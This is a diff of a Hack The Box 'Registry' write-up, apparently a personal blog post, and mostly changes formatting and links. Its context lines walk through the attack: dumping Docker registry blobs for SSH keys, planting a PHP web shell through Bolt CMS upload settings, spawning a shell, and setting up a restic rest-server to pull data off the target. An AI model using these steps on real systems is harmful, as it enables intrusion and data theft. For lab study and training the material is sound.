@@ -20,7 +20,7 @@ Registry was a pretty interesting Linux box. Not much to say here without spoili
 ### Resources
   1) [Docker API Documentation](https://docs.docker.com/registry/spec/api/#introduction).
   2) [Anatomy of a hack: Docker Registry](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)
-  3) [My Own Script](/Scripts/dockerBlobsDump.sh)
+  3) [My Own Script](https://github.com/grav3m1nd-byte/grav3m1nd-byte.github.io/blob/master/Scripts/dockerBlobsDump.sh)
   4) [Restic.net](https://restic.net/)
   5) [Create a REST server repository](https://restic.readthedocs.io/en/v0.4.0/Manual/#create-a-rest-server-repository)
   6) [SSH Port Forwarding Example](https://www.ssh.com/ssh/tunneling/example)
@@ -450,7 +450,9 @@ Note: Unnecessary use of -X or --request, GET is already inferred.
 ```
 
 ## Exploitation and Gaining Access
-The output is what we need, but we need to download each one as a tgz file and then uncompress to see if there is anything important. To do this I created a simple bash script that will download them as tgz, create logs files to make sure the download goes through as we need and uncompress in the process. The script can be found [HERE](/Scripts/dockerBlobsDump.sh)!
+The output is what we need, but we need to download each one as a tgz file and then uncompress to see if there is anything important. To do this I created a simple bash script that will download them as tgz, create logs files to make sure the download goes through as we need and uncompress in the process.
+
+The script can be found [HERE](https://github.com/grav3m1nd-byte/grav3m1nd-byte.github.io/blob/master/Scripts/dockerBlobsDump.sh)!
 
 With this script, we can dump all the blobs we need so we can dig deeper into the files contained on each blob.
 
@@ -522,7 +524,8 @@ sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
 
 While digging through the blob directories, we found the following:
 
-1) SSH key pairs in the 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/ directory
+1) SSH key pairs in the 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/ directory.
+
 2) Some scripts of interest (01-ssh.sh and 02-ssh.sh) under 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/etc/profile.d/
 
 Inspecting the second scripts gives us the passphrase for the id_rsa private key we found. Let's try these two:
@@ -556,7 +559,7 @@ Listing files in the bolt's user home directory gives us the user flag file **(W
 
 Well, so far we tried finding any files/directories where the bolt group has access to but not much came up, but if we try what files are world-readable under /var we see some interesting things:
 
-Basically we can read to the index.php file in the install directory inside /var/www/html and also there seems to be another directory called bolt(?!) where we can read basically all the files inside
+Basically we can read to the index.php file in the install directory inside /var/www/html and also there seems to be another directory called bolt(?!) where we can read basically all the files inside.
 ```
 bolt@bolt:~$ find /var -type f -perm -o=r 2> /dev/null
 /var/www/html/install/index.php
@@ -576,6 +579,7 @@ bolt@bolt:~$ find /var -type f -perm -o=r 2> /dev/null
 .
 /var/backups/bolt.tgz
 ```
+
 These files look like quite something and by looking at the changelog.md, we find Bolt related to Bolt CMS and its database uses SQLITE where it's stored in bolt/app/database/bolt.db.
 
 The first lines gives us the version of Bolt so we can look at some exploits if needed, but we need to also move bolt.db locally to use SQLite Browser and find out what is in there
@@ -644,7 +648,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2020/03/24 22:19:27 Finished
 ===============================================================
 ```
-The index.php should give us (possibly) a login page. This doesn't give us much, but as BOLT CMS is deployed under /var/www/html/bolt, it is possible we are looking at this incorrectly. Looking at BOLT CMS documentation, the login should be under /bolt, but it isn't the case. Let's do a test:
+The *index.php* page should give us (possibly) a login page. This doesn't give us much, but as BOLT CMS is deployed under /var/www/html/bolt, it is possible we are looking at this incorrectly. Looking at BOLT CMS documentation, the login should be under /bolt, but it isn't the case. Let's do a test:
 
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://registry.htb/bolt/bolt
@@ -716,7 +720,7 @@ My guess was right so let's access the CMS through the browser.
 
 While looking briefly in the CMS, I noticed File Management is up. After doing some check-ups we notice php files cannot be uploaded, and anything we upload normally goes away (gets deleted) very quickly, but if we upload any files as templates, they stay in perfectly.
 
-One place to check is the configuration (Main Configuration), we can find that the file extensions to upload can be modified (line 240), so we can add php and in a different tab, we can refresh (Ctrl+F5) twice and upload a simple shell by opening a port we can bind to, and in another tab access this shell. The sample shell to use is:
+One place to check is the configuration (Main Configuration), we can find that the file extensions to upload can be modified (**line 240**), so we can add php and in a different tab, we can refresh (Ctrl+F5) twice and upload a simple shell by opening a port we can bind to, and in another tab access this shell. The sample shell to use is:
 ```
 rce2.php:
 <?php
@@ -741,7 +745,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@bolt:~/html/bolt/theme$ 
 ```
 
-Let's run sudo -l to check on what we can run as sudo:
+Let's run *sudo -l* to check on what we can run as sudo:
 ```
 www-data@bolt:~/html/bolt/theme$ sudo -l
 sudo -l
@@ -759,7 +763,7 @@ Something else we need to look at, restic for backups. While looking into this, 
 
 This whole process tells me one way we can approach this is by "exfiltrating data" from registry.htb. We can't do anything else here other than running the restic backup command on anything.
 
-Let's setup the restic server (rest-server) in a separate terminal window, locally:
+Let's setup the restic server (*rest-server*) in a separate terminal window, locally:
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ rest-server --listen 0.0.0.0:8000 --path /home/kali/Documents/HTB-Labs/Registry --no-auth
 Data directory: /home/kali/Documents/HTB-Labs/Registry
